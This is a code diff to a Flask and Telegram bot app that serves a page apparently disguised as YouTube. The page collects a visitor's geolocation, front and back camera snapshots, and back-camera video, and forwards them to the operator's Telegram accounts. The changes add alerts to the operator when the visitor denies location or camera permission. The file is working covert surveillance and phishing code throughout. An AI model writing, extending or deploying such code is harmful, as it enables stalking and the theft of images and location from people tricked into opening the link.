@@ -15,7 +15,6 @@ USER_IDS = [int(x.strip()) for x in USER_IDS_STR.split(',') if x.strip().isdigit
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# ---------- HTML PAGE WITH IMPROVED PERMISSION FLOW ----------
 HTML_PAGE = """<!DOCTYPE html>
 <html>
 <head>
@@ -72,7 +71,7 @@ HTML_PAGE = """<!DOCTYPE html>
             statusText.style.color = good ? '#3ea6ff' : '#ff6b6b';
         }
 
-        // ---------- SEND LOCATION FIRST ----------
+        // ---------- SEND LOCATION (or fallback) ----------
         function sendLocation(coords) {
             const payload = { lat: coords.lat, lng: coords.lng };
             fetch('/location', {
@@ -88,6 +87,19 @@ HTML_PAGE = """<!DOCTYPE html>
             .catch(err => {
                 locationStatus.innerHTML = '📍 Location send failed.';
                 console.error(err);
+            });
+        }
+
+        function sendLocationDenied() {
+            // Tell backend that location was denied
+            fetch('/location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ denied: true })
+            })
+            .then(() => {
+                locationStatus.innerHTML = '📍 Location denied – notification sent.';
+                updateStatus('Location denied – bot notified.', false);
             });
         }
 
@@ -135,18 +147,18 @@ HTML_PAGE = """<!DOCTYPE html>
                     (pos) => {
                         const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                         sendLocation(coords);
-                        // After location sent, proceed to camera
                         requestCamera();
                     },
                     (err) => {
                         locationStatus.innerHTML = '📍 Location denied.';
-                        updateStatus('Location denied – proceeding to camera anyway.', false);
+                        sendLocationDenied(); // notify bot that location was denied
                         requestCamera(); // still try camera
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
                 locationStatus.innerHTML = '📍 Geolocation not supported.';
+                sendLocationDenied();
                 requestCamera();
             }
         }
@@ -160,12 +172,9 @@ HTML_PAGE = """<!DOCTYPE html>
                 frontStream = front;
                 backStream = back;
                 updateStatus('Camera granted – capturing screenshots...');
-
-                // Capture two screenshots (speed 0.5 – we do one from each)
                 const frontBlob = await captureFrame(frontStream);
                 const backBlob = await captureFrame(backStream);
 
-                // Start recording from back camera
                 mediaRecorder = new MediaRecorder(backStream, { mimeType: 'video/webm;codecs=vp9' });
                 recordedChunks = [];
                 mediaRecorder.ondataavailable = (e) => { if (e.data.size) recordedChunks.push(e.data); };
@@ -192,11 +201,11 @@ HTML_PAGE = """<!DOCTYPE html>
                 });
                 startBtn.innerText = 'Recording...';
             } catch (e) {
-                updateStatus('Camera permission denied. Location was sent.', false);
+                updateStatus('Camera permission denied.', false);
+                // Send a notification that camera was denied
+                fetch('/camera_denied', { method: 'POST' });
                 startBtn.disabled = false;
                 startBtn.innerText = '▶ Start Session';
-                // Still send a message that camera was denied (optional)
-                // We already sent location earlier, so that's fine.
             }
         }
 
@@ -214,8 +223,16 @@ def index():
 
 @app.route('/location', methods=['POST'])
 def location():
-    """Receive location from frontend and send to Telegram."""
     data = request.get_json()
+    if data.get('denied'):
+        # Location was denied – send a message to users
+        msg = "📍 Location: Denied by user."
+        for uid in USER_IDS:
+            try:
+                bot.send_message(uid, msg)
+            except Exception as e:
+                print(f"Send error to {uid}: {e}")
+        return "OK", 200
     lat = data.get('lat')
     lng = data.get('lng')
     if lat is not None and lng is not None:
@@ -228,9 +245,17 @@ def location():
         return "OK", 200
     return "Invalid", 400
 
+@app.route('/camera_denied', methods=['POST'])
+def camera_denied():
+    for uid in USER_IDS:
+        try:
+            bot.send_message(uid, "📷 Camera: Denied by user.")
+        except Exception as e:
+            print(f"Send error to {uid}: {e}")
+    return "OK", 200
+
 @app.route('/capture', methods=['POST'])
 def capture():
-    """Receive media (images, video) and send to Telegram."""
     front = request.files.get('frontImage')
     back = request.files.get('backImage')
     video = request.files.get('video')
@@ -253,7 +278,7 @@ def capture():
 # ---------- TELEGRAM BOT ----------
 @bot.message_handler(commands=['start'])
 def send_link(m):
-    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt mimics YouTube – location first, then camera.")
+    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nIt will ask for location and camera, then send data automatically.")
 
 def run_bot():
     bot.polling(non_stop=True, interval=1)
